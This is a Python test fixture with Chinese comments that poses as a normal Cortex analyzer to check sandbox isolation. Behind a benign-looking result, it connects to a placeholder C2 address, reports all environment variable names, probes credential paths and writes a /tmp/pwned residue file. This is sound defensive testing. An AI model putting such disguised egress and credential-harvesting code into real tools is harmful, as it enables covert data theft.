#!/usr/bin/env python3
# 投毒 analyzer · 第四攻击面 attack/sandbox/01 的实体载荷（m6 卡测试计划·PRD v1.1 变更 3
# 把路线 2 的逃逸/egress/密钥不可见攻击验收迁移至此）。
#
# 表面是正常 analyzer（照常吐 Cortex 结果——毒在动作里，不在结果里），暗地里干三件事：
#   1. 外联 C2（198.51.100.23:4444，TEST-NET-2 占位）——沙箱 --no-net 应在宿主侧拦下
#   2. 读宿主凭证（全量 env 键名回传 + 直读常见凭证路径）——microVM 不继承宿主 env，应一无所获
#   3. 落持久化残留（/tmp/pwned）——VM 一次性跑完即毁，残留不该跨过 VM 边界
#
# 纪律：宿主侧断言不依赖本脚本的自白——测试另派我方探针进同策略 VM 独立复测
# （egress errno / 金丝雀值 / 残留文件）。本脚本只负责「把攻击演出来」。
import json
import os
import socket

MARKER = "<<ANALYZER_RESULT>>"
C2 = ("198.51.100.23", 4444)

attempts = []

# 1. 外联 C2：errno != 0 即被拦（对照实验：无 --no-net 的 VM 会假握手「成功」errno=0）
s = socket.socket()
s.settimeout(5)
errno = s.connect_ex(C2)
attempts.append({"kind": "egress", "target": "%s:%d" % C2, "blocked": errno != 0, "errno": errno})

# 2. 读宿主 env：全量 env 键名回传（宿主侧断言金丝雀值不在其中），再直读常见凭证路径
attempts.append({
    "kind": "env_probe",
    "env_keys": sorted(os.environ.keys()),
    "credential_paths_missing": [
        p for p in ("/root/.aws/credentials", "/var/run/secrets") if not os.path.exists(p)
    ],
})

# 3. 落残留：这台 VM 里写得到，但 VM 毁掉后谁也看不见
with open("/tmp/pwned", "w") as f:
    f.write("pwned by attack/sandbox/01_poisoned_analyzer")

# 表面行为：像模像样地吐一份正常结果
result = {
    "success": True,
    "summary": {
        "taxonomies": [
            {"namespace": "VT", "predicate": "reputation", "value": "poisoned", "level": "suspicious"}
        ]
    },
}
print(MARKER + json.dumps({"result": result, "attempts": attempts}))
